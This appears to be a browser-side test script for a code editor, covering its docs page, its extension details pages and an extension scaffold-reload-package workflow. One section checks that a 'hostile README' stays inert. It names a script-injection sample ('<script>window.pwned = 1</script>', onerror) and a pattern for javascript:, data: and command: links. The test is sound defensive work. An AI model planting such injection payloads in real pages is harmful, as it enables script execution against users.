  const cmdLinks = $$('.docs-body a[href^="command:"]');
  const byId = new Map(w.commands.map((c) => [c.id, c]));
  const missing = cmdLinks.filter((a) => !byId.has(a.getAttribute('href').slice(8))).map((a) => a.getAttribute('href'));
  check('every command: link in the docs exists', cmdLinks.length >= 10 && missing.length === 0, missing);
  const mismatched = cmdLinks.filter((a) => byId.has(a.getAttribute('href').slice(8)) && byId.get(a.getAttribute('href').slice(8)).label !== a.textContent).map((a) => [a.textContent, byId.get(a.getAttribute('href').slice(8)).label]);
  check('docs name each command exactly as the palette does', mismatched.length === 0, mismatched);
  // supported languages in the docs match the editor
  const { LANGUAGE_NAMES } = await import('./editor/tokenizer.js');
  const langLine = /The `language` is one of: ([^.]+)\./.exec(docsText)[1];
  const docLangs = [...langLine.matchAll(/`([a-z]+)`/g)].map((m) => m[1]).sort();
  check('documented snippet languages are the real language ids', JSON.stringify(docLangs) === JSON.stringify(Object.keys(LANGUAGE_NAMES).sort()), [docLangs, Object.keys(LANGUAGE_NAMES).sort()]);
  // interaction
  const top = $('.docs').parentElement.scrollTop;
  click(tocLinks.find((a) => /Permissions/.test(a.textContent)), 'tocLinks.find((a) => /Permissions/.test(a.textContent))');
  check('clicking a TOC entry scrolls to the section', await waitFor(() => $('.docs').parentElement.scrollTop > top + 200), [top, $('.docs').parentElement.scrollTop]);
  await waitFor(() => /Permissions/.test($('.docs-toc a.on') ? $('.docs-toc a.on').textContent : ''));
  check('the section being read is highlighted', $$('.docs-toc a.on').length === 1 && /Permissions/.test($('.docs-toc a.on').textContent), $$('.docs-toc a.on').map((a) => a.textContent));
  const dsearch = $('.docs-search input');
  dsearch.value = 'keybinding'; dsearch.dispatchEvent(new Event('input'));
  const visible = $$('.docs-toc a').filter((a) => !a.hidden);
  check('searching filters the table of contents', visible.length > 0 && visible.length < tocLinks.length && visible.some((a) => /Keybindings/.test(a.textContent)), visible.map((a) => a.textContent));
  dsearch.value = 'zzzzqqqq'; dsearch.dispatchEvent(new Event('input'));
  check('a search with no hits says so', !$('.docs-empty').hidden);
  dsearch.value = ''; dsearch.dispatchEvent(new Event('input'));
  const copyBtn = $('.docs-body [data-copy]');
  click(copyBtn, 'copyBtn');
  check('copy buttons give feedback', await waitFor(() => /Copied|Press/.test(copyBtn.textContent)), copyBtn.textContent);
  const beforeToast = toasts().length;
  click($$('.docs-body a[href="command:ext-reload"]')[0], '$$(\'.docs-body a[href="command:ext-reload"]\')[0]');
  check('a command: link runs the command', await waitFor(() => toasts().some((t) => /Reloaded \d+ extension/.test(t))), toasts());
  check('the page survives running commands', w.S.active === docsDoc && !!$('.docs-body h1'));
  check('page tabs do not show editor status items', !$('#statusbar [data-act="change-language"]'));
  await w.openDocsPage();
  check('opening the guide again reuses the tab', w.S.docs.filter((d) => d.pageKey === 'docs').length === 1);

  // ======================= extension details page =======================
  const page = await w.openExtensionPage('sunlight.text-tools');
  check('details page opens as a tab', w.S.active === page && /Text Tools/.test($('.tab.active .tname').textContent));
  check('hero shows name, version and publisher', await waitFor(() => /Text Tools/.test(P$('.ext-hero h1')?.textContent || '') && /1\.0\.0/.test(P$('.ext-hero h1').textContent) && /Sunlight/.test(P$('.ext-sub').textContent)), P$('.ext-hero')?.textContent);
  check('installed extension offers Disable and Uninstall', P$$('.ext-actions button').map((b) => b.textContent).join('|') === 'Disable|Uninstall', P$$('.ext-actions button').map((b) => b.textContent));
  check('README is rendered with its table', await waitFor(() => P$('.ext-tabpanel .md-table table')), P$('.ext-tabpanel').innerHTML.slice(0, 120));
  click(P$$('.ext-tabs [data-tab]').find((b) => b.dataset.tab === 'features'), "P$$('.ext-tabs [data-tab]').find((b) => b.dataset.tab === 'features')");
  check('Features lists commands with their shortcuts', await waitFor(() => /Text: Sort Lines Ascending/.test(P$('.ext-tabpanel').textContent) && !!P$('.ext-tabpanel kbd')), P$('.ext-tabpanel').textContent.slice(0, 100));
  click(P$$('.ext-tabs [data-tab]').find((b) => b.dataset.tab === 'permissions'), "P$$('.ext-tabs [data-tab]').find((b) => b.dataset.tab === 'permissions')");
  check('Permissions explains each permission', await waitFor(() => /Read the text, selections and language/.test(P$('.ext-tabpanel').textContent) && /Change the text of the file/.test(P$('.ext-tabpanel').textContent)), P$('.ext-tabpanel').textContent.slice(0, 160));
  click(P$$('.ext-actions button').find((b) => b.textContent === 'Disable'), "P$$('.ext-actions button').find((b) => b.textContent === 'Disable')");
  check('the Disable button works from the page', await waitFor(() => P$$('.ext-actions button').map((b) => b.textContent).join('|') === 'Enable|Uninstall'), P$$('.ext-actions button').map((b) => b.textContent));
  check('...and the badge shows it', /Disabled/.test(P$('.ext-hero').textContent));
  click(P$$('.ext-actions button').find((b) => b.textContent === 'Enable'), "P$$('.ext-actions button').find((b) => b.textContent === 'Enable')");
  check('Enable brings it back', await waitFor(() => P$$('.ext-actions button').map((b) => b.textContent).join('|') === 'Disable|Uninstall' && host.get('sunlight.text-tools').enabled));
  // a not-yet-installed extension
  const paper = await w.openExtensionPage('sunlight.paper-theme');
  check('an extension that is not installed offers Install', await waitFor(() => P$$('.ext-actions button').map((b) => b.textContent).join('|') === 'Install'), P$$('.ext-actions button').map((b) => b.textContent));
  check('its tab has the extension icon', await waitFor(() => !!$('.tab.active .ticon img.ext-icon')));
  await w.installExtension(w.extPanel.catalog.find((c) => c.id === 'sunlight.paper-theme'), { skipConfirm: true });
  check('installing updates the open page', await waitFor(() => P$$('.ext-actions button').map((b) => b.textContent).join('|') === 'Disable|Uninstall'), P$$('.ext-actions button').map((b) => b.textContent));
  click(P$$('.ext-tabs [data-tab]').find((b) => b.dataset.tab === 'features'), "P$$('.ext-tabs [data-tab]').find((b) => b.dataset.tab === 'features')");
  check('theme extensions show a theme card', await waitFor(() => !!P$('.ext-theme') && /Paper/.test(P$('.ext-theme').textContent) && /light theme/.test(P$('.ext-theme').textContent)));
  click(P$('.ext-theme [data-act="theme"]'), '$(\'.ext-theme [data-act="theme"]\')');
  check('Use this theme applies it', await waitFor(() => w.S.settings.colorTheme === 'sunlight.paper-theme:paper' && getComputedStyle(root).getPropertyValue('--editor-bg').trim().toLowerCase() === '#fffdf8'), [w.S.settings.colorTheme, getComputedStyle(root).getPropertyValue('--editor-bg')]);
  check('the card then says Active', await waitFor(() => /Active/.test(P$('.ext-theme button')?.textContent || '')));
  check('a light theme selects the light base', root.dataset.theme === 'light');
  await w.uninstallExtension(w.extPanel.installed.find((x) => x.id === 'sunlight.paper-theme'), { skipConfirm: true });
  check('uninstalling the active theme restores the default', await waitFor(() => !root.style.getPropertyValue('--editor-bg') && w.S.settings.colorTheme === ''), [w.S.settings.colorTheme, root.style.getPropertyValue('--editor-bg')]);

  // hostile README: must never execute or load anything
  window.pwned = 0;
  const evil = await w.openExtensionPage('acme.noperms');
  check('a hostile README renders', await waitFor(() => /Totally Safe/.test(P$('.ext-tabpanel .md')?.textContent || '')));
  const md = P$('.ext-tabpanel .md');
  check('README: no script, img or iframe elements', !md.querySelector('script, img, iframe, object, embed, style, link'), md.innerHTML.slice(0, 200));
  check('README: raw HTML is shown as text', /<script>window\.pwned = 1<\/script>/.test(md.textContent) && /onerror=/.test(md.textContent));
  check('README: no javascript:, data: or command: links', ![...md.querySelectorAll('a')].some((a) => /^(javascript|data|command):/i.test(a.getAttribute('href') || '')), [...md.querySelectorAll('a')].map((a) => a.getAttribute('href')));
  check('README: images are not loaded', !!md.querySelector('.md-img') && !md.querySelector('img'));
  check('README: normal links survive', !!md.querySelector('a[href="https://example.com/docs"]'));
  const reloadsBefore = toasts().filter((t) => /Reloaded/.test(t)).length;
  [...md.querySelectorAll('a')].forEach((a) => a.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true })));
  await wait(300);
  check('README: clicking its links runs nothing', window.pwned === 0 && toasts().filter((t) => /Reloaded/.test(t)).length === reloadsBefore, window.pwned);

  // ======================= the developer workflow =======================
  const parent = `${DEMO}/../devwork`;
  await api.fs.createDir(parent);
  const made = await api.ext('scaffold', parent, { name: 'Dev Demo', publisher: 'Test Co' });
  check('scaffold creates a valid extension', made.id === 'test-co.dev-demo' && (await api.fs.readFile(`${made.dir}/index.js`)).text.includes("register('hello'"), made);
  await api.ext('addDev', made.dir);
  await w.afterExtChange();
  check('the new extension loads as a development extension', host.commands.has('test-co.dev-demo.hello') && w.extPanel.installed.find((x) => x.id === 'test-co.dev-demo').source === 'dev');
  w.openFile && 0;
  await w.openFile(`${DEMO}/style.css`);
  await call('test-co.dev-demo', 'hello');
  check('its Hello command talks to the editor', await waitFor(() => toasts().some((t) => /Dev Demo: Hello from style\.css!/.test(t))), toasts());
  // edit the code on disk and reload: new behaviour appears
  const src = (await api.fs.readFile(`${made.dir}/index.js`)).text.replace('Hello from ${file.name}!', 'Howdy from ${file.name}, edited live!');
  await api.fs.writeFile(`${made.dir}/index.js`, src);
  await w.reloadExtensions();
  await call('test-co.dev-demo', 'hello');
  check('edits are picked up after Reload Extensions', await waitFor(() => toasts().some((t) => /Howdy from style\.css, edited live!/.test(t))), toasts());
  // edit the manifest to break it: the extension is reported as invalid, not loaded
  await api.fs.writeFile(`${made.dir}/manifest.json`, '{ "id": "broken"');
  await w.reloadExtensions();
  check('a broken manifest is flagged, not loaded', !host.commands.has('test-co.dev-demo.hello') && await waitFor(() => /Invalid/.test($('#panel-ext').textContent)), $('#panel-ext').textContent.slice(0, 200));
  check('the reason is shown in the log', host.logLines.some((l) => /Not loaded/.test(l)), host.logLines.slice(-3));
  await api.fs.writeFile(`${made.dir}/manifest.json`, JSON.stringify({ id: made.id, name: 'Dev Demo', version: '0.1.0', main: 'index.js', permissions: ['editor.read'], contributes: { commands: [{ id: 'hello', title: 'Say Hello' }] } }));
  await w.reloadExtensions();
  check('fixing the manifest brings it back', host.commands.has('test-co.dev-demo.hello'));
  // package it
  const pkg = await api.ext('package', made.dir, `${parent}/out.zip`);
  check('packaging produces a zip with a checksum', pkg.files >= 3 && /^[a-f0-9]{64}$/.test(pkg.sha256) && pkg.id === made.id, pkg);
  const inspected = await api.ext('inspectZip', pkg.file);
  check('the package can be inspected before installing', inspected.id === made.id && inspected.permissions.join() === 'editor.read', inspected);
  // log document
  w.showExtensionLog();
  check('the extension log shows messages', w.S.active.readOnly && /\[acme\.broken\]/.test(w.S.active.buffer.getText()) && /\[test-co\.dev-demo\]/.test(w.S.active.buffer.getText()), w.S.active.buffer.getText().slice(0, 200));
  await api.ext('uninstall', 'test-co.dev-demo');

  out.stage = 'part3-done';
  out.failed = Object.entries(out.checks).filter(([, v]) => v !== 'ok');
  out.passed = Object.values(out.checks).filter((v) => v === 'ok').length;
  delete out.checks;
  return out;
})();
